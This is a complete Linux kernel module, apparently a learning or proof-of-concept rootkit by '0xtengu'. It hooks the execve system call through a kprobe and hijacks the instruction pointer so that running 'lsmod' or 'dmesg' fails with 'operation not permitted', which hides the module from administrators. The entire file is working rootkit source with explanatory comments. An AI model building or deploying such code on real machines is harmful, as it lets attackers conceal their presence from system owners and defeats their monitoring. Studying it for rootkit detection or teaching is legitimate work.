#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/ptrace.h> // required for struct pt_regs definition

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");

// the stub: returns "operation not permitted" (-1)
// this replaces the actual syscall when we decide to block it
asmlinkage long my_stub_function(void) {
    return -EPERM;
}

// pre-handler: runs just before the syscall instruction
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    char filename[256] = {0};
    char *path_addr;

    // kali/debian fix: syscall wrapper
    // on these OS's, the first argument to the syscall function (rdi)
    // is actually a pointer to another pt_regs struct containing the real args.
    struct pt_regs *real_regs = (struct pt_regs *)regs->di;

    // now we extract the 1st argument (filename) from that struct's di slot
    path_addr = (char *)real_regs->di;

    // copy string from userspace memory
    // note: execution hijacking inside kprobes is a race against the MMU.
    // if this string is paged out, this copy fails safe and we skip the block.
    if (strncpy_from_user(filename, (void __user *)path_addr, sizeof(filename)-1) > 0) {

        // check if the command contains our target strings
        // we use strstr to match substrings (e.g., /usr/bin/lsmod)
        if (strstr(filename, "lsmod") || strstr(filename, "dmesg")) {

            printk(KERN_INFO "rootkit: blocked execution of %s\n", filename);

            // hijack the instruction pointer (rip) to our stub
            // when this handler finishes, the cpu will jump to my_stub_function
            // instead of the original sys_execve code.
            regs->ip = (unsigned long)my_stub_function;

            // tell kprobes we modified the ip
            // returning 1 prevents kprobes from single-stepping the original instruction.
            return 1;
        }
    }
    return 0;
}

static struct kprobe kp = {
    .symbol_name = "__x64_sys_execve",
    .pre_handler = handler_pre,
};

static int __init rk_init(void) {
    return register_kprobe(&kp);
}

static void __exit rk_exit(void) {
    unregister_kprobe(&kp);
}

module_init(rk_init);
module_exit(rk_exit);
